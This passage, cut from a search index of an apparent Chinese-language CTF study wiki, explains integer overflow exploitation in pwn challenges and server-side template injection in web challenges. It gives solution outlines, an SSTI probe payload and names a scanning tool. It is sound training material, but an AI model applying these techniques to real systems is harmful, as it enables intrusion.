1\u3001\u662f\u5426\u53ef\u4ee5\u7a0b\u5e8f\u5316\u8bc6\u522b\uff1f\u662f\u5426\u53ef\u4ee5\u901a\u8fc7\u67e5\u8be2\u9898\u578b\u7279\u5f81\u6570\u636e\u5e93\u65b9\u5f0f\u4eba\u5de5\u8bc6\u522b\uff1f \u6574\u6570\u6ea2\u51fa\u7a0b\u5e8f\u5316\u8bc6\u522b\u8f83\u96be\u5b9e\u73b0\uff0c\u9700\u8981\u901a\u8fc7\u7ecf\u9a8c\u8fdb\u884c\u8bc6\u522b\uff0c\u4e3b\u8981\u662f\u7279\u5f81\u6570\u636e\u5e93\u65b9\u5f0f\u4eba\u5de5\u8bc6\u522b\u3002 2\u3001\u662f\u5426\u53ef\u4ee5\u5f62\u6210\u901a\u7528EXP\uff1f \u65e0\u6cd5\u5f62\u6210\u901a\u7528EXP\u3002","title":"\u6574\u6570\u6ea2\u51fa"},{"location":"TypesofChallenge/pwn/integer_overflow/#_1","text":"","title":"\u6574\u6570\u6ea2\u51fa"},{"location":"TypesofChallenge/pwn/integer_overflow/#_2","text":"\u6574\u578b\u6570\u636e\u5728\u5185\u5b58\u4e2d\u662f\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u7a7a\u95f4\uff0c\u5f53\u53d1\u751f\u8d4b\u503c\u65f6\uff0c\u53ef\u80fd\u8d85\u51fa\u6700\u5927\u503c\uff08\u6216\u6700\u5c0f\u503c\uff09\uff0c\u5bfc\u81f4\u6574\u6570\u6ea2\u51fa\u3002 \u6574\u6570\u6ea2\u51fa\u672c\u8eab\u5e76\u6ca1\u6709\u6539\u5199\u989d\u5916\u5185\u5b58\uff0c\u4f46\u662f\u5982\u679c\u8be5\u6574\u578b\u503c\u5bf9\u5e94\u7684\u662f\u7f13\u51b2\u533a\u5927\u5c0f\u6216\u6570\u503c\u7d22\u5f15\u65f6\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6f5c\u5728\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u4ece\u800c\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002","title":"\u4e00\u3001\u6f0f\u6d1e\u6210\u56e0"},{"location":"TypesofChallenge/pwn/integer_overflow/#_3","text":"\u7c7b\u578b \u5b57\u8282 \u8303\u56f4 __int8,bool,char 1byte 0~127(0~0x7f) -128~-1(0x80~0xff) unsigned char 1byte 0~255(0~0xff) __int16,short 2byte(word) 0~32767(0~0x7fff) -32768~-1(0x8000~0xffff) unsigned short 2byte(word) 0~65535(0~0xffff) __int32,int,long 4byte(dword) 0~2147483647(0~0x7fffffff) -2147483648~-1(0x80000000~0xffffffff) unsigned int,unsigned long 4byte(dword) 0~4294967295(0~0xffffffff) __int64,long long 8byte(qword) \u6b63: 0~0x7fffffffffffffff \u8d1f: 0x8000000000000000~0xffffffffffffffff unsigned long long 8byte(qword) 0~0xffffffffffffffff","title":"\u4e8c\u3001\u4e3b\u8981\u77e5\u8bc6"},{"location":"TypesofChallenge/pwn/integer_overflow/#ctf","text":"\u6ce8\u610f\uff1a\u56e0\u6574\u6570\u6ea2\u51fa\u7684\u7279\u6b8a\u6027\uff0c\u5728PWN\u7c7b\u578b\u4e2d\u5f80\u5f80\u4e0e\u7f13\u51b2\u533a\u6ea2\u51fa\u540c\u65f6\u8003\u5bdf\uff0c\u6b64\u5916\u8fd8\u53ef\u80fd\u51fa\u73b0\u5728WEB\uff0cRE\u7b49\u9898\u578b\u4e2d\u3002","title":"\u4e09\u3001CTF\u9898\u578b\u5206\u7c7b"},{"location":"TypesofChallenge/pwn/integer_overflow/#1","text":"\uff081\uff09\u9898\u578b\u7279\u5f81 \u53d8\u91cf\u8d4b\u503c\uff0c\u6ca1\u6709\u6709\u6548\u5730\u9650\u5236\u5176\u8303\u56f4\u3002 a\u3001\u5bf9\u4e8e\u6709\u7b26\u53f7\u6570\uff0c\u5f53\u540c\u7b26\u53f7\u7684\u4e24\u6570\u76f8\u52a0\uff08\u4e58\uff09\u65f6\uff0c\u5c31\u53ef\u80fd\u6539\u53d8\u7b26\u53f7\u4f4d\uff0c\u5bfc\u81f4\u6ea2\u51fa\u3002 b\u3001\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6570\uff0c\u5f53\u6700\u5c0f\u6570-1\u65f6\u53d8\u4e3a\u6700\u5927\u6570\uff0c\u5f53\u6700\u5927\u6570+1\u65f6\u53d8\u4e3a\u6700\u5c0f\u6570\uff0c\u5bfc\u81f4\u56de\u7ed5\u3002 \uff082\uff09\u5e38\u7528\u89e3\u9898\u5957\u8def a\u3001\u6ce8\u610f\u754c\u9650\uff0c\u7528char\u578b\u6765\u4e3e\u4f8b\uff0c127+1=-128\uff0c-128-1=127\uff0c0-1=-1\uff0c-1+1=0\uff1b \u200b \u7528unsigned char\u578b\u6765\u4e3e\u4f8b\uff0c0-1=255\uff0c255+1=0\uff1b b\u3001\u6ce8\u610f\u76f8\u7b49\u5173\u7cfb\uff0c\u7528int\u578b\u6765\u4e3e\u4f8b\uff0c0x80000000 = -0x80000000\uff1b","title":"1\u3001\u672a\u9650\u5236\u8303\u56f4"},{"location":"TypesofChallenge/pwn/integer_overflow/#2","text":"\uff081\uff09\u9898\u578b\u7279\u5f81 \u53c2\u6570\u4f20\u9012\u65f6\uff0c\u88ab\u8feb\u7c7b\u578b\u8f6c\u6362\u3002 a\u3001\u5f53\u5c06\u4e00\u4e2a\u8f83\u5927\u5bbd\u5ea6\u7684\u6570\u5b58\u5165\u4e00\u4e2a\u8f83\u5c0f\u5bbd\u5ea6\u53d8\u91cf\u4e2d\u65f6\uff0c\u9ad8\u4f4d\u53d1\u751f\u622a\u65ad\u3002 b\u3001\u5f53\u6709\u7b26\u53f7\u6570\u4f5c\u4e3a\u65e0\u7b26\u53f7\u6570\u4f7f\u7528\u65f6\uff0c\u9020\u6210\u6570\u636e\u91cf\u7684\u6269\u5927\u3002 \uff082\uff09\u5e38\u7528\u89e3\u9898\u5957\u8def a\u3001\u9690\u85cf\u7684\u7c7b\u578b\uff0ctypedef unsigned int size_t\uff1b b\u3001\u6f0f\u6d1e\u591a\u53d1\u51fd\u6570\uff0cvoid memcpy(void dest, const void *src, size_t n); \u200b char strncpy(char dest, const char *src, size_t n); \u200b size_t read(int fd, const void* buf, size_t n); c\u3001\u7279\u522b\u6ce8\u610f\u7c7b\u578b\u7684\u5927\u5c0f\uff0clong long > long = int > short > char\uff1b","title":"2\u3001\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362"},{"location":"TypesofChallenge/pwn/integer_overflow/#_4","text":"","title":"\u56db\u3001\u4f8b\u9898"},{"location":"TypesofChallenge/pwn/integer_overflow/#1-2020-","text":"\uff081\uff09\u9898\u76ee \u8fd9\u662f\u4e00\u4e2a\u4e0e\u53f2\u83b1\u59c6\u548c\u6076\u9f99\u6218\u6597\u7684\u6545\u4e8b\uff0c\u8bf7\u6218\u80dc\u4e09\u5934\u6076\u9f99\uff0c\u53d6\u5f97flag\u3002\u5f20\u4e09\u957f\u8001\u8bf4\uff0c\u8bd5\u56fepatch\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4eba\u4f1a\u5f97\u5230\u9519\u8bef\u7684flag\u2026 \uff082\uff09\u89e3\u9898\u601d\u8def \u6709\u7b26\u53f7\u6570\u7684\u6ea2\u51fa\uff0c\u4ece\u8d1f\u6570\u6ea2\u51fa\u5230\u6b63\u6570\uff0c\u7ed5\u8fc7\u9a8c\u8bc1\u6761\u4ef6\uff0c\u5b9e\u73b0\u6570\u503c\u7684\u6539\u5199\uff0c\u5f97\u5230flag\u3002 \uff083\uff09 wp","title":"1\u3001\u7f51\u9f0e\u676f-2020-\u767d\u864e\u7ec4-\u6076\u9f99"},{"location":"TypesofChallenge/pwn/integer_overflow/#2-pwn-int_overflow","text":"\uff081\uff09\u9898\u76ee \u8fd9\u9898\u4f3c\u4e4e\u6ca1\u6709\u529e\u6cd5\u6ea2\u51fa\uff0c\u771f\u7684\u4e48? \uff082\uff09\u89e3\u9898\u601d\u8def \u4e00\u4e2asize_t\u5230unsigned __int8\u7684\u9690\u85cf\u7c7b\u578b\u8f6c\u6362\uff0c\u5bfc\u81f4\u622a\u65ad\u53ef\u7ed5\u8fc7\u6761\u4ef6\u8bed\u53e5\uff0c\u9020\u6210\u6808\u6ea2\u51fa\uff0c\u6539\u5199\u8fd4\u56de\u5730\u5740\u3002 \uff083\uff09 wp","title":"2\u3001\u653b\u9632\u4e16\u754c-PWN\u65b0\u624b\u533a-int_overflow"},{"location":"TypesofChallenge/pwn/integer_overflow/#3zctf-2016-note3","text":"\uff081\uff09\u9898\u76ee \u65e0\u3002 \uff082\uff09\u89e3\u9898\u601d\u8def \u4f7f\u75280x8000000000000000 = -0x8000000000000000\u7ed5\u8fc7\u9650\u5236\u6761\u4ef6\uff0c\u7136\u540e\u5c31\u662f\u6b63\u5e38\u7684unlink\u3002 \uff083\uff09 wp","title":"3\u3001ZCTF-2016-note3"},{"location":"TypesofChallenge/pwn/integer_overflow/#_5","text":"1\u3001\u662f\u5426\u53ef\u4ee5\u7a0b\u5e8f\u5316\u8bc6\u522b\uff1f\u662f\u5426\u53ef\u4ee5\u901a\u8fc7\u67e5\u8be2\u9898\u578b\u7279\u5f81\u6570\u636e\u5e93\u65b9\u5f0f\u4eba\u5de5\u8bc6\u522b\uff1f \u6574\u6570\u6ea2\u51fa\u7a0b\u5e8f\u5316\u8bc6\u522b\u8f83\u96be\u5b9e\u73b0\uff0c\u9700\u8981\u901a\u8fc7\u7ecf\u9a8c\u8fdb\u884c\u8bc6\u522b\uff0c\u4e3b\u8981\u662f\u7279\u5f81\u6570\u636e\u5e93\u65b9\u5f0f\u4eba\u5de5\u8bc6\u522b\u3002 2\u3001\u662f\u5426\u53ef\u4ee5\u5f62\u6210\u901a\u7528EXP\uff1f \u65e0\u6cd5\u5f62\u6210\u901a\u7528EXP\u3002","title":"\u4e94\u3001\u5907\u6ce8"},{"location":"TypesofChallenge/web/SSTI/","text":"SSTI \u4e00\u3001\u6f0f\u6d1e\u6210\u56e0 \u5f53\u7528\u6237\u7684\u8f93\u5165\u6570\u636e\u6ca1\u6709\u88ab\u5408\u7406\u7684\u5904\u7406\u63a7\u5236\u65f6\uff0c\u5c31\u6709\u53ef\u80fd\u6570\u636e\u63d2\u5165\u4e86\u7a0b\u5e8f\u6bb5\u4e2d\u53d8\u6210\u4e86\u7a0b\u5e8f\u7684\u4e00\u90e8\u5206\uff0c\u4ece\u800c\u6539\u53d8\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u903b\u8f91 \u3002 \u6f0f\u6d1e\u6700\u65e9\u6765\u81ea\u4e8e2015 blackhat Server-Side Template Injection: RCE for the modern webapp \u3002 \u4e8c\u3001CTF\u9898\u578b\u5206\u7c7b 1\u3001\u76f2\u6253 \uff081\uff09\u9898\u578b\u7279\u5f81\uff08\u8bc6\u522b\u65b9\u6cd5\uff09 1.Url?xxx=[\u7528\u6237\u8f93\u5165]\uff0c\u540c\u65f6\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u53ef\u4ee5\u5728\u9875\u9762\u4e0a\u770b\u5230\uff1b 2.Http\u5934server\u8fd4\u56de\u5e38\u89c1\u6a21\u677f\uff0c\u5982flask\u7b49 \uff082\uff09\u5e38\u7528\u89e3\u9898\u5957\u8def \u4e00\u822c\u4f1a\u5b9e\u73b0\u6536\u96c6\u597d\u4e00\u4e9b\u6a21\u677f\u6ce8\u5165\u5e38\u89c4\u7684payload\uff0c\u5982{{ 7+7 }} or {7+7}\uff0c\u770b\u9875\u9762\u4e0a\u8f93\u51fa\u7684\u5185\u5bb9\u662f\u5426\u4e3a49\u3002\u7136\u540e\u6839\u636e\u6a21\u677f\u7684\u79cd\u7c7b\u9009\u62e9payload\u3002\u5404\u4e2a\u6a21\u677f\u5bf9\u5e94\u7684paylaod\u5982\u4e0b pic 2\u3001\u4ee3\u7801\u5ba1\u8ba1 \uff081\uff09\u9898\u578b\u7279\u5f81 \u4e3b\u8981\u89c1\u4e8e\u5404\u79cdCMS\u4e2d\uff0c\u8fd9\u7c7b\u8f6f\u4ef6\u7684\u7279\u70b9\u662f\u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u90fd\u4f1a\u6709\u591a\u4e2a\u7c7b\u4f3c\u98ce\u683c\u7684\u9875\u9762\uff0c\u8fd9\u4e9b\u9875\u9762\u901a\u8fc7\u4e00\u4e2a\u56fa\u5b9a\u7684\u6a21\u677f\u751f\u6210\uff0c\u9700\u8981\u5ba1\u8ba1\u6a21\u677f\u4ee3\u7801\u83b7\u53d6SSTI\u6f0f\u6d1e\u3002 \uff082\uff09\u5e38\u7528\u89e3\u9898\u5957\u8def CMS\u5ba1\u8ba1\u4e2d\uff0c\u4e00\u822c\u6a21\u677f\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u6587\u4ef6\u58f0\u660e\uff0c\u5728\u6587\u4ef6\u4e2d\u6709xxxheadxxx/xxxfootxxx\u4e4b\u7c7b\u7684\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u4ee3\u8868\u5934/\u5c3e\u6a21\u677f\u7684\u751f\u6210\uff0c\u770b\u8fd9\u4e9b\u51fd\u6570\u662f\u5426\u5141\u8bb8\u7528\u6237\u8f93\u5165\uff0c\u5982\u679c\u5141\u8bb8\uff0c\u5927\u6982\u7387\u5b58\u5728\u6a21\u677f\u6ce8\u5165\u3002 \u4e09\u3001\u4f8b\u9898\uff08\u6700\u597d\u6bcf\u7c7b\u90fd\u6709\u4e00\u4e2a\u5178\u578b\u4f8b\u9898\uff09 1\u30012018\u62a4\u7f51\u676f -- easy_tornado \uff081\uff09\u9898\u76ee \u7ebf\u4e0a\u5e73\u53f0https://buuoj.cn \uff082\uff09\u89e3\u9898\u601d\u8def\uff08\u51dd\u7ec3\u3001\u63d0\u70bc\u3001\u7b80\u77ed\uff09 error\u9875\u9762\u663e\u793a\u4e86\u7528\u6237\u8f93\u5165\u4fe1\u606f\uff0c\u53ef\u505aSSTI\u3002 \uff083\uff09wp\uff08\u53ef\u4ee5\u662f\u81ea\u5df1\u7684\u4e5f\u53ef\u4ee5\u662f\u94fe\u63a5\uff09 https://www.cnblogs.com/xhds/p/12285121.html 2\u30012018qwb\u7ebf\u4e0b\u8d5b \uff081\uff09\u9898\u76ee cscms 4.1.75, \u4e92\u8054\u7f51\u53ef\u4e0b\u3002 \uff082\uff09\u89e3\u9898\u601d\u8def\uff08\u51dd\u7ec3\u3001\u63d0\u70bc\u3001\u7b80\u77ed\uff09 {cscmsphp}{/cscmsphp}\u6807\u7b7e\u4e2d\u5185\u5bb9\u672a\u7ecf\u9a8c\u8bc1\u76f4\u63a5\u7ed9eval\u51fd\u6570\u5904\u7406\u3002 \uff083\uff09wp\uff08\u53ef\u4ee5\u662f\u81ea\u5df1\u7684\u4e5f\u53ef\u4ee5\u662f\u94fe\u63a5\uff09 2019\u5f3a\u7f51\u676f\u7ebf\u4e0bweb\u9898\u89e3 \u56db\u3001\u5907\u6ce8 1\u3001\u662f\u5426\u53ef\u4ee5\u7a0b\u5e8f\u5316\u8bc6\u522b\uff1f\u662f\u5426\u53ef\u4ee5\u901a\u8fc7\u67e5\u8be2\u9898\u578b\u7279\u5f81\u6570\u636e\u5e93\u65b9\u5f0f\u4eba\u5de5\u8bc6\u522b\uff1f \u76f2\u6253\u7684\u53ef\u4ee5\uff0c\u628a\u4e0a\u9762\u56fe\u7684\u6240\u6709\u5185\u5bb9\u5199\u4e00\u4e2a\u7206\u7834\u5c31\u53ef\u4ee5\u9a8c\u8bc1\u662f\u5426\u5b58\u5728\u3002\u5de5\u5177\u540d\u5b57Tplmap \u5ba1\u8ba1\u7684\u8bdd\u5f97\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\u3002 2\u3001\u662f\u5426\u53ef\u4ee5\u5f62\u6210\u901a\u7528EXP\uff1f \u76f2\u6253\u53ef\u4ee5\uff0c\u5ba1\u8ba1\u4e0d\u884c \u4e94\u3001Reference 1. SSTI/\u6c99\u76d2\u9003\u9038\u8be6\u7ec6\u603b\u7ed3 2. \u4e00\u7bc7\u6587\u7ae0\u5e26\u4f60\u7406\u89e3\u6f0f\u6d1e\u4e4bSSTI\u6f0f\u6d1e","title":"SSTI\u6a21\u677f\u6ce8\u5165"},{"location":"TypesofChallenge/web/SSTI/#ssti","text":"","title":"SSTI"},{"location":"TypesofChallenge/web/SSTI/#_1","text":"\u5f53\u7528\u6237\u7684\u8f93\u5165\u6570\u636e\u6ca1\u6709\u88ab\u5408\u7406\u7684\u5904\u7406\u63a7\u5236\u65f6\uff0c\u5c31\u6709\u53ef\u80fd\u6570\u636e\u63d2\u5165\u4e86\u7a0b\u5e8f\u6bb5\u4e2d\u53d8\u6210\u4e86\u7a0b\u5e8f\u7684\u4e00\u90e8\u5206\uff0c\u4ece\u800c\u6539\u53d8\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u903b\u8f91 \u3002 \u6f0f\u6d1e\u6700\u65e9\u6765\u81ea\u4e8e2015 blackhat Server-Side Template Injection: RCE for the modern webapp \u3002","title":"\u4e00\u3001\u6f0f\u6d1e\u6210\u56e0"},{"location":"TypesofChallenge/web/SSTI/#ctf","text":"","title":"\u4e8c\u3001CTF\u9898\u578b\u5206\u7c7b"},{"location":"TypesofChallenge/web/SSTI/#1","text":"","title":"1\u3001\u76f2\u6253"},{"location":"TypesofChallenge/web/SSTI/#1_1","text":"1.Url?xxx=[\u7528\u6237\u8f93\u5165]\uff0c\u540c\u65f6\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u53ef\u4ee5\u5728\u9875\u9762\u4e0a\u770b\u5230\uff1b 2.Http\u5934server\u8fd4\u56de\u5e38\u89c1\u6a21\u677f\uff0c\u5982flask\u7b49","title":"\uff081\uff09\u9898\u578b\u7279\u5f81\uff08\u8bc6\u522b\u65b9\u6cd5\uff09"},{"location":"TypesofChallenge/web/SSTI/#2","text":"\u4e00\u822c\u4f1a\u5b9e\u73b0\u6536\u96c6\u597d\u4e00\u4e9b\u6a21\u677f\u6ce8\u5165\u5e38\u89c4\u7684payload\uff0c\u5982{{ 7+7 }} or {7+7}\uff0c\u770b\u9875\u9762\u4e0a\u8f93\u51fa\u7684\u5185\u5bb9\u662f\u5426\u4e3a49\u3002\u7136\u540e\u6839\u636e\u6a21\u677f\u7684\u79cd\u7c7b\u9009\u62e9payload\u3002\u5404\u4e2a\u6a21\u677f\u5bf9\u5e94\u7684paylaod\u5982\u4e0b pic","title":"\uff082\uff09\u5e38\u7528\u89e3\u9898\u5957\u8def"},{"location":"TypesofChallenge/web/SSTI/#2_1","text":"","title":"2\u3001\u4ee3\u7801\u5ba1\u8ba1"},{"location":"TypesofChallenge/web/SSTI/#1_2","text":"\u4e3b\u8981\u89c1\u4e8e\u5404\u79cdCMS\u4e2d\uff0c\u8fd9\u7c7b\u8f6f\u4ef6\u7684\u7279\u70b9\u662f\u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u90fd\u4f1a\u6709\u591a\u4e2a\u7c7b\u4f3c\u98ce\u683c\u7684\u9875\u9762\uff0c\u8fd9\u4e9b\u9875\u9762\u901a\u8fc7\u4e00\u4e2a\u56fa\u5b9a\u7684\u6a21\u677f\u751f\u6210\uff0c\u9700\u8981\u5ba1\u8ba1\u6a21\u677f\u4ee3\u7801\u83b7\u53d6SSTI\u6f0f\u6d1e\u3002","title":"\uff081\uff09\u9898\u578b\u7279\u5f81"},{"location":"TypesofChallenge/web/SSTI/#2_2","text":"CMS\u5ba1\u8ba1\u4e2d\uff0c\u4e00\u822c\u6a21\u677f\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u6587\u4ef6\u58f0\u660e\uff0c\u5728\u6587\u4ef6\u4e2d\u6709xxxheadxxx/xxxfootxxx\u4e4b\u7c7b\u7684\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u4ee3\u8868\u5934/\u5c3e\u6a21\u677f\u7684\u751f\u6210\uff0c\u770b\u8fd9\u4e9b\u51fd\u6570\u662f\u5426\u5141\u8bb8\u7528\u6237\u8f93\u5165\uff0c\u5982\u679c\u5141\u8bb8\uff0c\u5927\u6982\u7387\u5b58\u5728\u6a21\u677f\u6ce8\u5165\u3002","title":"\uff082\uff09\u5e38\u7528\u89e3\u9898\u5957\u8def"},{"location":"TypesofChallenge/web/SSTI/#_2","text":"","title":"\u4e09\u3001\u4f8b\u9898\uff08\u6700\u597d\u6bcf\u7c7b\u90fd\u6709\u4e00\u4e2a\u5178\u578b\u4f8b\u9898\uff09"},{"location":"TypesofChallenge/web/SSTI/#12018-easy_tornado","text":"","title":"1\u30012018\u62a4\u7f51\u676f -- easy_tornado"},{"location":"TypesofChallenge/web/SSTI/#1_3","text":"\u7ebf\u4e0a\u5e73\u53f0https://buuoj.cn","title":"\uff081\uff09\u9898\u76ee"},{"location":"TypesofChallenge/web/SSTI/#2_3","text":"error\u9875\u9762\u663e\u793a\u4e86\u7528\u6237\u8f93\u5165\u4fe1\u606f\uff0c\u53ef\u505aSSTI\u3002","title":"\uff082\uff09\u89e3\u9898\u601d\u8def\uff08\u51dd\u7ec3\u3001\u63d0\u70bc\u3001\u7b80\u77ed\uff09"},{"location":"TypesofChallenge/web/SSTI/#3wp","text":"https://www.cnblogs.com/xhds/p/12285121.html","title":"\uff083\uff09wp\uff08\u53ef\u4ee5\u662f\u81ea\u5df1\u7684\u4e5f\u53ef\u4ee5\u662f\u94fe\u63a5\uff09"},{"location":"TypesofChallenge/web/SSTI/#22018qwb","text":"","title":"2\u30012018qwb\u7ebf\u4e0b\u8d5b"},{"location":"TypesofChallenge/web/SSTI/#1_4","text":"cscms 4.1.75, \u4e92\u8054\u7f51\u53ef\u4e0b\u3002","title":"\uff081\uff09\u9898\u76ee"},{"location":"TypesofChallenge/web/SSTI/#2_4","text":"{cscmsphp}{/cscmsphp}\u6807\u7b7e\u4e2d\u5185\u5bb9\u672a\u7ecf\u9a8c\u8bc1\u76f4\u63a5\u7ed9eval\u51fd\u6570\u5904\u7406\u3002","title":"\uff082\uff09\u89e3\u9898\u601d\u8def\uff08\u51dd\u7ec3\u3001\u63d0\u70bc\u3001\u7b80\u77ed\uff09"},{"location":"TypesofChallenge/web/SSTI/#3wp_1","text":"2019\u5f3a\u7f51\u676f\u7ebf\u4e0bweb\u9898\u89e3","title":"\uff083\uff09wp\uff08\u53ef\u4ee5\u662f\u81ea\u5df1\u7684\u4e5f\u53ef\u4ee5\u662f\u94fe\u63a5\uff09"},{"location":"TypesofChallenge/web/SSTI/#_3","text":"1\u3001\u662f\u5426\u53ef\u4ee5\u7a0b\u5e8f\u5316\u8bc6\u522b\uff1f\u662f\u5426\u53ef\u4ee5\u901a\u8fc7\u67e5\u8be2\u9898\u578b\u7279\u5f81\u6570\u636e\u5e93\u65b9\u5f0f\u4eba\u5de5\u8bc6\u522b\uff1f \u76f2\u6253\u7684\u53ef\u4ee5\uff0c\u628a\u4e0a\u9762\u56fe\u7684\u6240\u6709\u5185\u5bb9\u5199\u4e00\u4e2a\u7206\u7834\u5c31\u53ef\u4ee5\u9a8c\u8bc1\u662f\u5426\u5b58\u5728\u3002\u5de5\u5177\u540d\u5b57Tplmap \u5ba1\u8ba1\u7684\u8bdd\u5f97\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\u3002 2\u3001\u662f\u5426\u53ef\u4ee5\u5f62\u6210\u901a\u7528EXP\uff1f \u76f2\u6253\u53ef\u4ee5\uff0c\u5ba1\u8ba1\u4e0d\u884c","title":"\u56db\u3001\u5907\u6ce8"},{"location":"TypesofChallenge/web/SSTI/#reference","text":"1. SSTI/\u6c99\u76d2\u9003\u9038\u8be6\u7ec6\u603b\u7ed3 2. \u4e00\u7bc7\u6587\u7ae0\u5e26\u4f60\u7406\u89e3\u6f0f\u6d1e\u4e4bSSTI\u6f0f\u6d1e","title":"\u4e94\u3001Reference"},{"location":"Utils/Utils/","text":"Utils \u5f85\u8865\u5145\u3002\u3002\u3002","title":"\u5de5\u5177"},{"location":"Utils/Utils/#utils","text":"\u5f85\u8865\u5145\u3002\u3002\u3002","title":"Utils"}]}